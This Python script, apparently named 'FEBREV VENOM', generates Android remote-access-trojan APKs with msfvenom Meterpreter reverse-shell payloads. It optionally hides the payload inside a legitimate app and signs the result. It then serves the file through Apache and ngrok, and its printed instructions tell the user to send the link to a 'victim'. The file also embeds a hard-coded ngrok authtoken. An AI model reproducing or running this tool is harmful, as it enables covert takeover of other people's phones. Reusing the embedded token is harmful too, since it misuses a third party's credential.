import os
print("""
  ______ ______ ____  _____  ________      __ __      ________ _   _  ____  __  __ 
 |  ____|  ____|  _ \|  __ \|  ____\ \    / / \ \    / /  ____| \ | |/ __ \|  \/  |
 | |__  | |__  | |_) | |__) | |__   \ \  / /   \ \  / /| |__  |  \| | |  | | \  / |
 |  __| |  __| |  _ <|  _  /|  __|   \ \/ /     \ \/ / |  __| | . ` | |  | | |\/| |
 | |    | |____| |_) | | \ \| |____   \  /       \  /  | |____| |\  | |__| | |  | |
 |_|    |______|____/|_|  \_\______|   \/         \/   |______|_| \_|\____/|_|  |_|
                                                                                   
                                                                                                                                        
                                                                 
                    =====>>> coded by FEBIN REV                                                                                             
     
 """)
print("""[1]android/meterpreter/reverse_tcp
[2]android/meterpreter/reverse_http
[3]android/meterpreter/reverse_https

""")
payload=int(input("ENTER THE SERIAL OF THE PAYLOAD YOU WANNA USE : "))
output=input("ENTER THE PATH OF YOUR OUTPUT APK (example : /root/Desktop)[note: dont use ' / ':at the end of path] : ")
name=input("ENTER THE NAME OF YOUR RAT APK(example: rat.apk) : ")
lhost=input("ENTER YOUR IP ADDRESS(lhost) : ")
lport=input("ENTER YOUR LISTENER PORT(lport) : ")
def venom():
    if payload==1:
        bind=input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
        if bind=="Y" or bind=="Y":
            realapp=input("ENTER THE PATH OF THE ORIGINAL APK : ")
            if os.path.exists(realapp):
                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {output}/{name} ")
                print("SIGNING YOUR APK>>>>>>")
                os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                print("D--O--N--E...........!!!!!!")
            else:
                print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                print("failed........!!!!!!!")
        elif bind=="n" or bind=="N":
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {output}/{name}")
            print("SIGNING YOUR APK>>>>>>")
            os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")

        else:
            print("INVALID INPUT>>>>>>!!!!!")

    elif payload==2:
        bind = input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
        if bind == "Y" or bind == "Y":
            realapp = input("ENTER THE PATH OF THE ORIGINAL APK : ")
            if os.path.exists(realapp):
                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_http lhost={lhost} lport={lport} > {output}/{name} ")
                print("SIGNING YOUR APK>>>>>>")
                os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                print("D--O--N--E...........!!!!!!")
            else:
                print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                print("failed........!!!!!!!")
        elif bind == "n" or bind == "N":
            os.system(f"msfvenom -p android/meterpreter/reverse_http lhost={lhost} lport={lport} > {output}/{name}")
            print("SIGNING YOUR APK>>>>>>")
            os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")

        else:
            print("INVALID INPUT>>>>>>!!!!!")

    elif payload==3:
        bind = input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
        if bind == "Y" or bind == "Y":
            realapp = input("ENTER THE PATH OF THE ORIGINAL APK : ")
            if os.path.exists(realapp):
                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_https lhost={lhost} lport={lport} > {output}/{name} ")
                print("SIGNING YOUR APK>>>>>>")
                os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                print("D--O--N--E...........!!!!!!")
            else:
                print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                print("failed........!!!!!!!")
        elif bind == "n" or bind == "N":
            os.system(f"msfvenom -p android/meterpreter/reverse_https lhost={lhost} lport={lport} > {output}/{name}")
            print("SIGNING YOUR APK>>>>>>")
            os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")

        else:
            print("INVALID INPUT>>>>>>!!!!!")
            print("exiting.......please rerun the tool")

    else:
        print("PLEASE SELECT A PAYLOAD.............!!!")
        print("exiting......")


    server=input("DO YOU WANT TO SEND YOUR PAYLOAD VIA A LINK? [Y/n] : ")
    if server=="Y" or server=="y":
        os.system(f"cp {output}/{name} /var/www/html")
        print("SERVER STARTED......")
        print(f" COPY THE LINK BELOW AND ADD ' /{name}  AND SEND THE LINK URL TO YOUR VICTIM")
        print(f" <link>/{name}  ")
        print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
        ack=input("do you understand?? : ")
        os.system("service apache2 start")
        os.system("./ngrok authtoken 2XcCsw8PnxhUVTGfNWwnh_3fNaAM4NLwHS7Tk9mvwBw")
        os.system("./ngrok http 80")
    elif server=="n" or server=="N":
        exiting=input("ANY KEY TO EXIT....")
        print("##########  HAPPY HACKING ###########")
   
        



if __name__=="__main__":
    venom()
    
